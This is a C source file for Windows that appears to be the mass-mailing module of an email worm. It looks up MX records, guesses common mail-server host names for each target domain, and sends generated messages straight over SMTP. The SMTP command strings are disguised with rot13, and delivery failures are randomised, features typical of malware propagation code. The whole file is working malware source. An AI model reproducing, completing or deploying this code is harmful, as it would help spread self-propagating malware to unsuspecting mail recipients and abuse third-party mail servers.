#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <windns.h>
#include <iphlpapi.h>
#include "xdns.h"
#pragma comment(lib, "ws2_32.lib")
//#pragma comment(lib, "user32.lib")

#define mx_alloc(n) ((void*)HeapAlloc(GetProcessHeap(),0,(n)))
#define mx_free(p) {HeapFree(GetProcessHeap(),0,(p));}

#define TYPE_MX 15
#define CLASS_IN 1

#pragma pack(push, 1)
struct dnsreq_t {
	WORD id;
	WORD flags;
	WORD qncount;
	WORD ancount;
	WORD nscount;
	WORD arcount;
};
#pragma pack(pop)

struct mxlist_t {
	struct mxlist_t *next;
	int pref;
	char mx[256];
};

struct mxlist_t *get_mx_list(const char *domain);

static int mx_dns2qname(const char *domain, unsigned char *buf)
{
	int i, p, t;
	for (i=0,p=0;;) {
		if (domain[i] == 0) break;
		for (t=i; domain[t] && (domain[t] != '.'); t++);
		buf[p++] = (t - i);
		while (i < t) buf[p++] = domain[i++];
		if (domain[i] == '.') i++;
	}
	buf[p++] = '\0';
	return p;
}

static int mx_make_query(int sock, struct sockaddr_in *dns_addr, const char *domain, WORD req_flags)
{
	unsigned char buf[1024];
	int i, tmp;

	memset(buf, 0, sizeof(buf));
	i = 0;
	*(WORD *)(buf+i) = (WORD)(GetTickCount() & 0xFFFF); i += 2;
	*(WORD *)(buf+i) = req_flags; i += 2;		/* flags */
	*(WORD *)(buf+i) = htons(0x0001); i += 2;	/* qncount */
	*(WORD *)(buf+i) = 0; i += 2;
	*(WORD *)(buf+i) = 0; i += 2;
	*(WORD *)(buf+i) = 0; i += 2;

	tmp = mx_dns2qname(domain, buf+i); i += tmp;
	*(WORD *)(buf+i) = htons(TYPE_MX); i += 2;
	*(WORD *)(buf+i) = htons(CLASS_IN); i += 2;

	tmp = sendto(sock, buf, i, 0, (struct sockaddr *)dns_addr, sizeof(struct sockaddr_in));
	return (tmp <= 0) ? 1 : 0;
}

struct mxlist_t *get_mx_list(const char *domain)
{
	struct mxlist_t *p;
	if ((p = getmx_dnsapi(domain)) != NULL)
		return p;
	else
		return getmx_mydns(domain);
}

void free_mx_list(struct mxlist_t *p)
{
	struct mxlist_t *q;
	while (p != NULL) {
		q = p->next;
		mx_free(p);
		p = q;
	}
}




static struct mxlist_t *my_get_mx_list2(struct sockaddr_in *dns_addr, const char *domain, int *err_stat)
{
	int sock, reply_len, rrcode, buf_size;
	int loc_retry;
	struct timeval tv;
	struct fd_set fds;
	unsigned char *buf;
	unsigned short query_fl;
	struct dnsreq_t *reply_hdr;
	struct mx_rrlist_t *rrlist=NULL, *rr1;
	struct mxlist_t *mxlist_root, *mxlist_top, *mxlist_new;

	*err_stat = 1;

	buf_size = 4096;
	buf = (char *)mx_alloc(buf_size);
	if (buf == NULL) return NULL;

	sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == 0 || sock == INVALID_SOCKET) {
		mx_free(buf);
		return NULL;
	}

	for (loc_retry=0; loc_retry<2; loc_retry++) {
		mxlist_root = mxlist_top = NULL;

		if (loc_retry == 0)
			query_fl = htons(0x0100);
		else
			query_fl = htons(0);

		if (mx_make_query(sock, dns_addr, domain, query_fl))
			continue;

		FD_ZERO(&fds); FD_SET(sock, &fds);
		tv.tv_sec = 12; tv.tv_usec = 0;
		if (select(0, &fds, NULL, NULL, &tv) <= 0)
			continue;

		memset(buf, '\0', sizeof(buf));
		reply_len = recv(sock, buf, buf_size,0);
		if (reply_len <= 0 || reply_len <= sizeof(struct dnsreq_t))
			continue;

		reply_hdr = (struct dnsreq_t *)buf;

		rrcode = ntohs(reply_hdr->flags) & 0x0F;
		if (rrcode == 3) {
			*err_stat = 2;
			break;
		}
		if ((rrcode == 2) && (ntohs(reply_hdr->flags) & 0x80)) {
			*err_stat = 2;
			break;
		}
		if (rrcode != 0)
			continue;

		rrlist = mx_parse_rr(buf, reply_len);
		if (rrlist == NULL)
			continue;

		mxlist_root = mxlist_top = NULL;
		for (rr1=rrlist; rr1; rr1=rr1->next) {
			if ((rr1->rr_class != CLASS_IN) || (rr1->rr_type != TYPE_MX) || (rr1->rdlen < 3))
				continue;
			mxlist_new = (struct mxlist_t *)mx_alloc(sizeof(struct mxlist_t));
			if (mxlist_new == NULL) break;
			memset(mxlist_new, 0, sizeof(struct mxlist_t));

			mxlist_new->pref = ntohs(*(WORD *)(buf+rr1->rdata_offs+0));
			mx_decode_domain(buf, rr1->rdata_offs+2, reply_len, mxlist_new->mx);
			if (mxlist_new->mx[0] == 0) {
				mx_free(mxlist_new);
				continue;
			}

			if (mxlist_top == NULL) {
				mxlist_root = mxlist_top = mxlist_new;
			} else {
				mxlist_top->next = mxlist_new;
				mxlist_top = mxlist_new;
			}
		}

		if (mxlist_root == NULL) {
			mx_free_rrlist(rrlist);
			continue;
		}

		mx_free_rrlist(rrlist);
		break;
	}
	mx_free(buf);
	closesocket(sock);
	return mxlist_root;
}

struct mxlist_t *my_get_mx_list(struct sockaddr_in *dns_addr, const char *domain)
{
	struct mxlist_t *list;
	int i, e;
	for (i=0; i<2; i++) {
		list = my_get_mx_list2(dns_addr, domain, &e);
		if (list != NULL) return list;
		if (e == 2)		/* permanent error */
			break;
		Sleep(100);
	}
	return NULL;
}


typedef DWORD (WINAPI *GetNetworkParams_t)(PFIXED_INFO, PULONG);

static struct mxlist_t *getmx_mydns(const char *domain)
{
	static const char szIphlpapiDll[] = "iphlpapi.dll";
	HINSTANCE hIphlpapi;
	GetNetworkParams_t pGetNetworkParams;
	char *info_buf;
	FIXED_INFO *info;
	IP_ADDR_STRING *pa;
	DWORD dw, info_buf_size;
	struct sockaddr_in addr;
	struct mxlist_t *mxlist;

	hIphlpapi = GetModuleHandle(szIphlpapiDll);
	if (hIphlpapi == NULL || hIphlpapi == INVALID_HANDLE_VALUE)
		hIphlpapi = LoadLibrary(szIphlpapiDll);
	if (hIphlpapi == NULL || hIphlpapi == INVALID_HANDLE_VALUE) return NULL;
	pGetNetworkParams = (GetNetworkParams_t)GetProcAddress(hIphlpapi, "GetNetworkParams");
	if (pGetNetworkParams == NULL) return NULL;

	info_buf_size = 16384;
	info_buf = (char *)mx_alloc(info_buf_size);
	dw = info_buf_size;
	info = (FIXED_INFO *)info_buf;
	if (pGetNetworkParams(info, &dw) != ERROR_SUCCESS)
		return NULL;

	for (mxlist=NULL,pa=&info->DnsServerList; pa; pa=pa->Next) {
		if (pa->IpAddress.String == NULL) continue;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(53);
		addr.sin_addr.s_addr = inet_addr(pa->IpAddress.String);
		if (addr.sin_addr.s_addr == 0 || addr.sin_addr.s_addr == 0xFFFFFFFF) {
			struct hostent *h = gethostbyname(pa->IpAddress.String);
			if (h == NULL) continue;
			addr.sin_addr = *(struct in_addr *)h->h_addr_list[0];
		}
		if (addr.sin_addr.s_addr == 0 || addr.sin_addr.s_addr == 0xFFFFFFFF)
			continue;

		mxlist = my_get_mx_list(&addr, domain);
		if (mxlist != NULL) break;
	}
	mx_free(info_buf);
	return mxlist;
}



typedef DNS_STATUS (WINAPI *DNSQUERYA)(IN PCSTR pszName, IN WORD wType, IN DWORD Options, IN PIP4_ARRAY aipServers OPTIONAL, IN OUT PDNS_RECORD *ppQueryResults OPTIONAL, IN OUT PVOID *pReserved OPTIONAL);

static struct mxlist_t *getmx_dnsapi(const char *domain)
{
	HINSTANCE hDnsapi;
	DNSQUERYA pDnsQuery_A;
	DNS_RECORD *pQueryResults, *pQueryRec;
	DNS_STATUS statusDns;
	char szDnsApi[] = "dnsapi.dll";
	struct mxlist_t *mx_root, *mx_top, *mx_new;

	hDnsapi = GetModuleHandle(szDnsApi);
	if (hDnsapi == NULL) {
		hDnsapi = LoadLibrary(szDnsApi);
		if (hDnsapi == NULL) return NULL;
	}
	pDnsQuery_A = (DNSQUERYA)GetProcAddress(hDnsapi, "DnsQuery_A");
	if (pDnsQuery_A == NULL) return NULL;

	statusDns = pDnsQuery_A(domain, DNS_TYPE_MX, DNS_QUERY_STANDARD, NULL, &pQueryResults, NULL);
	if (statusDns != ERROR_SUCCESS) return NULL;

	mx_root = mx_top = NULL;
	for (pQueryRec=pQueryResults; pQueryRec; pQueryRec = pQueryRec->pNext) {
		if (pQueryRec->wType != DNS_TYPE_MX) continue;
		mx_new = (struct mxlist_t *)mx_alloc(sizeof(struct mxlist_t));
		if (mx_new == NULL) break;
		memset(mx_new, '\0', sizeof(struct mxlist_t));
		mx_new->pref = pQueryRec->Data.MX.wPreference;
		lstrcpyn(mx_new->mx, pQueryRec->Data.MX.pNameExchange, 255);
		if (mx_top == NULL) {
			mx_root = mx_top = mx_new;
		} else {
			mx_top->next = mx_new;
			mx_top = mx_new;
		}
	}
	return mx_root;
}

struct dnscache_t *mm_get_mx(const char *domain)
{
	struct dnscache_t *cached;
	struct mxlist_t *mxs;
	if ((cached = mmdns_getcached(domain)) != NULL) {
		cached->ref++;
		return cached;
	}
	mxs = get_mx_list(domain);
	if ((mxs == NULL) && ((GetTickCount() % 4) != 0))
		return NULL;
	mmdns_addcache(domain, mxs);
	cached = mmdns_getcached(domain);
	if (cached == NULL)
		/* original: */
		return NULL;

		/* should be: */
		/* { free_mx_list(mxs); return NULL; } */

	cached->ref++;
	return cached;
}

void mmsender(struct mailq_t *email)
{
	char domain[MAX_DOMAIN], *p;
	char *msg = NULL;
	struct dnscache_t *mxs_cached=NULL;
	struct mxlist_t *mxs=NULL;

	for (p=email->to; *p && *p != '@'; p++);
	if (*p++ != '@') return;
	lstrcpyn(domain, p, MAX_DOMAIN-1);

	mxs_cached = mm_get_mx(domain);
	if (mxs_cached == NULL)
		return;

	msg = msg_generate(email->to);
	if (msg == NULL) goto ex1;
	smtp_send(mxs_cached->mxs, msg);

	if (msg != NULL)
		GlobalFree((HGLOBAL)msg);
ex1:	if (mxs_cached != NULL)
		if (mxs_cached->ref > 0) mxs_cached->ref--;
	return;
}




int smtp_send(struct mxlist_t *primary_mxs, char *message)
{
	struct sockaddr_in addr;
	char rcpt[256], rcpt_domain[256], *p, buf[256];
	struct mxlist_t *mxl;
	int i;

	if (message == NULL) return 1;

	if (mail_extracthdr(message, "To", rcpt, sizeof(rcpt))) return 1;
	for (p=rcpt; *p && *p != '@'; p++);
	if (*p == 0) return 1;
	lstrcpy(rcpt_domain, p+1);

	for (mxl=primary_mxs; mxl; mxl=mxl->next) {
		addr.sin_addr.s_addr = resolve(mxl->mx);
		if (addr.sin_addr.s_addr == 0) continue;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(25);
		if (smtp_send_server(&addr, message) == 0)
			return 0;
	}

	for (i=0;; i++) {
		switch(i) {
			case 0: lstrcpy(buf, rcpt_domain); break;
			case 1: wsprintf(buf, "mx.%s", rcpt_domain); break;
			case 2: wsprintf(buf, "mail.%s", rcpt_domain); break;
			case 3: wsprintf(buf, "smtp.%s", rcpt_domain); break;
			case 4: wsprintf(buf, "mx1.%s", rcpt_domain); break;
			case 5: wsprintf(buf, "mxs.%s", rcpt_domain); break;
			case 6: wsprintf(buf, "mail1.%s", rcpt_domain); break;
			case 7: wsprintf(buf, "relay.%s", rcpt_domain); break;
			case 8: wsprintf(buf, "ns.%s", rcpt_domain); break;
			case 9: wsprintf(buf, "gate.%s", rcpt_domain); break;
			default: buf[0] = 0; break;
		}
		if (buf[0] == 0) break;
		addr.sin_addr.s_addr = resolve(buf);
		if (addr.sin_addr.s_addr == 0) continue;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(25);
		if (smtp_send_server(&addr, message) == 0) return 0;

		//if ((xrand16() % 100) < 20) break;
	}

	return 1;
}

static int wait_sockread(SOCKET sock, unsigned long timeout)
{
	struct timeval tv;
	fd_set fds;

	tv.tv_sec = timeout / 1000;
	tv.tv_usec = (timeout % 1000) * 1000;
	FD_ZERO(&fds);
	FD_SET(sock, &fds);
	return (select(0, &fds, NULL, NULL, &tv) <= 0) ? 1 : 0;
}

static int smtp_issue(SOCKET sock, int timeout, LPCTSTR lpFormat, ...)
{
	char buf[1024], *p;
	int code;

	if (lpFormat != NULL) {
		va_list arglist;
			va_start(arglist, lpFormat);
		wvsprintf(buf, lpFormat, arglist);
		va_end(arglist);
		send(sock, buf, lstrlen(buf), 0);
	}

	for (;;) {
		if (recvline(sock, buf, sizeof(buf), timeout) <= 0) return 0;
		for (p=buf, code=0; *p == ' ' || *p == '\t'; p++);
		while (*p >= '0' && *p <= '9') code = code * 10 + *p++ - '0';
		if (*p == '-') continue;
		break;
	}

	return code;
}

static int smtp_send_server(struct sockaddr_in *addr, char *message)
{
	char from[256], from_domain[256], rcpt[256], *p, *q;
	char fmt[256];
	int stat;
	SOCKET sock;

	if (mail_extracthdr(message, "From", from, sizeof(from))) return 1;
	if (mail_extracthdr(message, "To", rcpt, sizeof(rcpt))) return 1;
	for (p=from; *p && *p != '@'; p++);
	if (*p == 0) return 1;
	lstrcpy(from_domain, p+1);

	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) return 1;
	if (connect(sock, (struct sockaddr *)addr, sizeof(struct sockaddr_in)))
		goto err;

	if (wait_sockread(sock, 15000)) goto err;
	stat = smtp_issue(sock, 15000, NULL);
	if (stat < 200 || stat >= 400) goto err;

	rot13(fmt, "RUYB %f\r\n");	/* EHLO %s */
	stat = smtp_issue(sock, 10000, fmt, from_domain);
	if (stat < 200 || stat > 299) {
		rot13(fmt, "URYB %f\r\n");	/* "HELO %s\r\n" */
		stat = smtp_issue(sock, 10000, fmt, from_domain);
		if (stat < 200 || stat > 299) goto err;
	}

	rot13(fmt, "ZNVY SEBZ:<%f>\r\n");	/* "MAIL FROM:<%s>\r\n" */
	stat = smtp_issue(sock, 10000, fmt, from);
	if (stat < 200 || stat > 299) goto err;
	rot13(fmt, "EPCG GB:<%f>\r\n");		/* "RCPT TO:<%s>\r\n" */
	stat = smtp_issue(sock, 10000, fmt, rcpt);
	if (stat < 200 || stat > 299) goto err;

	stat = smtp_issue(sock, 10000, "DATA\r\n");
	if (stat < 200 || stat > 399) goto err;

	for (p=message;;) {
		for (q=p; *q && *q != '\n' && *q != '\r'; q++);
		while (*q == '\n' || *q == '\r') q++;
		if (p == q) break;

		if (*p == '.') send(sock, ".", 1, 0);
		if (send(sock, p, q-p, 0) <= 0) goto err;
		p = q;
	}

	send(sock, "\r\n.\r\n", 5, 0);

	stat = smtp_issue(sock, 15000, NULL);
	if (stat < 200 || stat >= 400) goto err;

	smtp_issue(sock, 5000, "QUIT\r\n");

	closesocket(sock);
	return 0;

err:	closesocket(sock);
	return 1;
}

#define my_tolower(c) (((c) >= 'a' && (c) <= 'z') ? ((c)-'a'+'A') : (c));
#define my_isdigit(c) ((c) >= '0' && (c) <= '9')
#define my_isalpha(c) (((c) >= 'a' && (c) <= 'z') || ((c) >= 'A' && (c) <= 'Z'))
#define my_isalnum(c) (my_isdigit(c) || my_isalpha(c))

static int recvline(SOCKET s, char *buf, int size, unsigned long timeout)
{
	int i, t;
	for (i=0; (i+1)<size;) {
		if (timeout != 0) {
			fd_set fds;
			struct timeval tv;
			FD_ZERO(&fds);
			FD_SET(s, &fds);
			tv.tv_sec = timeout / 1000;
			tv.tv_usec = (timeout % 1000) * 1000;
			if (select(0, &fds, NULL, NULL, &tv) <= 0)
				break;
		}
		t = recv(s, buf+i, 1, 0);
		if (t < 0) return -1;
		if (t == 0) break;
		if (buf[i++] == '\n') break;
	}
	buf[i] = 0;
	return i;
}



